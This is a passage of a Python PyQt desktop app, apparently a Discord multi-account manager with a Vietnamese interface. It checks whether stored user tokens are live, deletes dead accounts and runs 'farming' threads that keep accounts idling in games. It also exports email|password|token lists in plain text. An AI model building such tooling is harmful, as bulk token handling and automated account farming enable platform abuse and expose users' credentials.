        
        def make_row(title, value, val_class=""):
            w = QWidget()
            l = QHBoxLayout(w)
            l.setContentsMargins(0, 0, 0, 0)
            l.setSpacing(8)
            lbl_t = QLabel(title)
            lbl_t.setStyleSheet("color: #a855f7; font-weight: bold;")
            lbl_v = QLabel(str(value))
            if val_class == "val_green": lbl_v.setStyleSheet("color: #10B981;")
            elif val_class == "val_red": lbl_v.setStyleSheet("color: #EF4444;")
            l.addWidget(lbl_t)
            l.addWidget(lbl_v)
            l.addStretch()
            return w
            
        uid = data.get('id', 'Unknown')
        email = data.get('email', 'Unknown')
        verified = data.get('verified', False)
        ver_text = "Đã xác minh" if verified else "Chưa xác minh"
        ver_class = "val_green" if verified else "val_red"
        
        username = data.get('username', 'Unknown')
        phone = data.get('phone')
        phone_text = phone if phone else "Không"
        phone_class = "" if phone else "val_red"
        locale = data.get('locale', 'en-US')
        
        col1.addWidget(make_row("ID:", uid))
        col1.addWidget(make_row("Email:", email))
        col1.addWidget(make_row("Xác minh:", ver_text, ver_class))
        
        col2.addWidget(make_row("User:", username))
        col2.addWidget(make_row("SĐT:", phone_text, phone_class))
        col2.addWidget(make_row("Quốc gia:", locale))
        
        layout.addLayout(col1)
        layout.addLayout(col2)
        
        container = QWidget()
        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(15, 5, 15, 5) 
        container_layout.addWidget(frame)
        return container

    def update_token_status(self, token, is_live, data):
        row_idx = -1
        for i in range(self.table.rowCount()):
            item = self.table.item(i, 3)
            if item and item.text() == token:
                row_idx = i
                break
        
        if row_idx == -1: return

        short_tk = token[:15] + "..." if len(token) > 15 else token
        status = "Sống" if is_live else "Chết"
        
        if is_live:
            self.log(f"Token {short_tk} => Live (An Toàn).", "SUCCESS")
        else:
            self.log(f"Token {short_tk} => Die.", "ERROR")
        
        self.table.blockSignals(True)
        item_status = self.table.item(row_idx, 4)
        if item_status:
            item_status.setText(status)
            item_status.setForeground(Qt.GlobalColor.green if is_live else Qt.GlobalColor.red)
        self.table.blockSignals(False)

        cursor = self.db_conn.cursor()
        cursor.execute("UPDATE accounts_v2 SET song_chet = ? WHERE token = ?", (status, token))
        self.db_conn.commit()

        if is_live and data:
            detail_row_idx = row_idx + 1
            self.table.insertRow(detail_row_idx)
            self.table.setSpan(detail_row_idx, 0, 1, 7)
            
            detail_widget = self.create_detail_widget(data)
            self.table.setCellWidget(detail_row_idx, 0, detail_widget)
            self.table.setRowHeight(detail_row_idx, 120)

    def cleanup_dead_accounts(self):
        rows_to_delete = []
        dead_usernames = []
        dead_tokens = []
        
        for i in range(self.table.rowCount() - 1, -1, -1):
            item = self.table.item(i, 4)
            if item and item.text() == "Chết":
                token = self.table.item(i, 3).text()
                username_item = self.table.item(i, 1)
                
                rows_to_delete.append((i, token))
                dead_tokens.append(token)
                if username_item:
                    dead_usernames.append(username_item.text().strip())
        
        if rows_to_delete:
            cursor = self.db_conn.cursor()
            for row, token in rows_to_delete:
                cursor.execute("DELETE FROM accounts_v2 WHERE token=?", (token,))
                self.table.removeRow(row)
            self.db_conn.commit()
            
            for token in dead_tokens:
                for t in self.farmer_threads[:]:
                    if getattr(t, 'token', None) == token:
                        t.stop()
                        t.quit()
                        self.farmer_threads.remove(t)
                        
            self.log(f"Dọn dẹp hoàn tất. Đã xóa {len(rows_to_delete)} tài khoản chết khỏi hệ thống.", "WARNING")
        else:
            self.log("Kiểm tra hoàn tất. Toàn bộ tài khoản trên hệ thống vẫn sống.", "SUCCESS")
            
        if HAS_WEBENGINE:
            closed_tabs = 0
            for i in range(self.browser_tabs.count() - 1, -1, -1):
                tab_title = self.browser_tabs.tabText(i).strip()
                if tab_title in dead_usernames:
                    self.browser_tabs.removeTab(i)
                    closed_tabs += 1
            
            if closed_tabs > 0:
                self.log(f"Hệ thống đã tự động đóng {closed_tabs} tab Discord.", "WARNING")
                    
        self.refresh_discord_tabs()

    def toggle_farming(self):
        if self.farmer_threads:
            self.current_auto_farm = False
            self.cfg_auto_farm.setCurrentIndex(0)
            for t in self.farmer_threads:
                t.stop()
                t.quit()
            self.farmer_threads.clear()
            self.btn_farm.setText("TREO CHƠI GAME")
            self.btn_farm.setObjectName("btn_success")
            self.apply_professional_theme() 
            self.log("Đã dừng tác vụ nuôi tài khoản.", "WARNING")
            
            self.table.blockSignals(True)
            for i in range(self.table.rowCount()):
                item = self.table.item(i, 5)
                if item: item.setText("")
            self.table.blockSignals(False)
        else:
            self.current_auto_farm = True
            self.cfg_auto_farm.setCurrentIndex(1)
            self.start_all_farming_if_needed()

    def export_tokens(self):
        if not self.table.rowCount(): 
            self.log("Không có dữ liệu để xuất file.", "ERROR")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Xuất File TXT", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            out = []
            for i in range(self.table.rowCount()):
                em = self.table.item(i, 0)
                if em is None: continue 
                em = em.text()
                pw = self.table.item(i, 2).text()
                tk = self.table.item(i, 3).text()
                out.append(f"{em}|{pw}|{tk}")
                
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("\n".join(out))
            self.log(f"Đã xuất danh sách thành công ra file: {file_path}", "SUCCESS")

if __name__ == '__main__':
    import ctypes
    try:
        app_id = "atikoy.discord.manager.1.0"
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(app_id)
    except:
        pass
    
    app = QApplication(sys.argv)
    icon_path = "logo.jpg"
    if os.path.exists(icon_path):
        app.setWindowIcon(QIcon(icon_path))
        
    window = AtikoyApp()
    window.show()
    sys.exit(app.exec())